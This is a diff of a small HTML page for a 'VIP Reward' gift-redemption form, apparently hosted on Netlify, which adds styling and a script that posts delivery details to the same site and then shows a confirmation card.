@@ -1,29 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>VIP Gift Redemption</title>
+  <title>VIP Reward</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #111827;
+      padding: 30px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 420px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+    }
+
+    h2 {
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #9ca3af;
+      font-size: 14px;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: none;
+      background: #1f2937;
+      color: white;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 16px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #6366f1, #22c55e);
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .success {
+      display: none;
+      text-align: center;
+    }
+  </style>
 </head>
+
 <body>
 
-<h1>Your VIP Gift is Ready</h1>
-<p>Please fill in your delivery details.</p>
+<div class="card" id="formCard">
 
-<form name="gift_redemption" method="POST" data-netlify="true" action="/vip system/success/">
-  <input type="hidden" name="form-name" value="gift_redemption">
+  <h2>🎁 Your VIP Reward is Ready</h2>
+  <p>Please confirm your delivery details below.</p>
 
-  <input name="full_name" placeholder="Full Name" required><br><br>
-  <input name="country_code" placeholder="Country Code" required><br><br>
-  <input name="phone_number" placeholder="Phone Number" required><br><br>
-  <input name="country" placeholder="Country" required><br><br>
-  <input name="state" placeholder="State" required><br><br>
-  <input name="city" placeholder="City" required><br><br>
-  <input name="street_address" placeholder="Street Address" required><br><br>
-  <input name="postal_code" placeholder="Postal Code" required><br><br>
-  <input name="email" type="email" placeholder="Email" required><br><br>
-  <textarea name="feedback_message" placeholder="Feedback Message"></textarea><br><br>
+  <form name="gift_redemption" method="POST" data-netlify="true">
 
-  <button type="submit">Submit</button>
-</form>
+    <input type="hidden" name="form-name" value="gift_redemption">
+
+    <input name="full_name" placeholder="Full Name" required>
+    <input name="phone_number" placeholder="Phone Number" required>
+    <input name="country" placeholder="Country" required>
+    <input name="city" placeholder="City" required>
+    <input name="street_address" placeholder="Street Address" required>
+    <input name="postal_code" placeholder="Postal Code" required>
+    <input name="email" type="email" placeholder="Email" required>
+
+    <textarea name="feedback_message" placeholder="Message (optional)"></textarea>
+
+    <button type="submit">Confirm Delivery</button>
+
+  </form>
+</div>
+
+<div class="card success" id="successCard">
+  <h2>✅ Submission Received</h2>
+  <p>Our team will arrange your delivery shortly.</p>
+</div>
+
+<script>
+  const form = document.querySelector("form");
+  const formCard = document.getElementById("formCard");
+  const successCard = document.getElementById("successCard");
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const data = new FormData(form);
+
+    fetch("/", {
+      method: "POST",
+      body: data
+    }).then(() => {
+      formCard.style.display = "none";
+      successCard.style.display = "block";
+    }).catch(() => alert("Submission failed"));
+  });
+</script>
 
 </body>
 </html>
